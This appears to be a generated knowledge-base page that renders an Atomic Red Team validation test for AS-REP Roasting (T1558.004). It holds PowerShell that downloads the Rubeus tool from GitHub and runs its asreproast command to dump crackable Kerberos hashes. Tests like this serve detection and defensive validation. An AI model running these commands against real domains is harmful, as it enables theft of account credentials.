---
atomic_guid: "615bd568-2859-41b5-9aed-61f6a88e48dd"
title: "Rubeus asreproast"
framework: "atomic"
generated: "true"
attack_technique_id: "T1558.004"
attack_technique_name: "Steal or Forge Kerberos Tickets: AS-REP Roasting"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1558.004/T1558.004.yaml"
build_date: "2026-04-27 19:12:28"
executor: "powershell"
aliases:
  - "615bd568-2859-41b5-9aed-61f6a88e48dd"
  - "Rubeus asreproast"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast
This build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus

## ATT&CK Mapping

- [[kb/attack/techniques/T1558-steal_or_forge_kerberos_tickets#^t1558004-as-rep-roasting|T1558.004: AS-REP Roasting]]

## Input Arguments

### local_executable

- description: name of the rubeus executable
- type: string
- default: rubeus.exe

### local_folder

- description: Local path of Rubeus executable
- type: path
- default: PathToAtomicsFolder\..\ExternalPayloads

### out_file

- description: file where command results are stored
- type: string
- default: rubeus_output.txt

### rubeus_url

- description: URL of Rubeus executable
- type: url
- default: https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe

## Dependencies

Computer must be domain joined

### Prerequisite Check

```powershell
if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
Write-Host Joining this computer to a domain must be done manually
```

Rubeus must exist

### Prerequisite Check

```powershell
if(Test-Path -Path "#{local_folder}\#{local_executable}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-Webrequest -Uri #{rubeus_url} -OutFile #{local_folder}\#{local_executable}
```

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
cmd.exe /c "#{local_folder}\#{local_executable}" asreproast /outfile:"#{local_folder}\#{out_file}"
```

### Cleanup

```powershell
Remove-Item "#{local_folder}\#{out_file}" -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1558.004/T1558.004.yaml)
